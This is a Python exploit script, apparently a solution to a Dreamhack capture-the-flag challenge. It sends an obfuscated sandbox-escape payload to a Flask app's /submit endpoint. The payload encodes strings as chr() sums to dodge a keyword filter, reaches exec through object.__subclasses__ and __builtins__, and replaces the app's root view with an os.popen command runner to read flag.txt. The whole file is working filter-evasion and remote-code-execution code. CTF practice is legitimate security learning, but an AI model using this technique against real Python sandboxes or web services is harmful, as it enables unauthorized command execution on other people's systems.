import requests

url = "http://host8.dreamhack.games:12646"

def conv(s):
    return "+".join([f'chr({ord(c)})' for c in s])

def obf(payload):
    return f"""getattr(getattr([i for i in getattr(object, {conv("__subclasses__")})() if {conv('wrap_')} in str(i)][0], {conv("__init__")}), {conv("__builtins__")})[{conv('exec')}]({conv(payload)})"""

def rce(cmd):
    return obf(f"__import__('flask').current_app.view_functions['main'] = lambda: __import__('os').popen('{cmd}').read()")

# override root endpoint
res = requests.post(f'{url}/submit', data={'code': rce('cat flag.txt')})

if "no hack" in res.text.lower():
    print("filtered")
    exit()

# get result
res = requests.get(url)
print(res.text)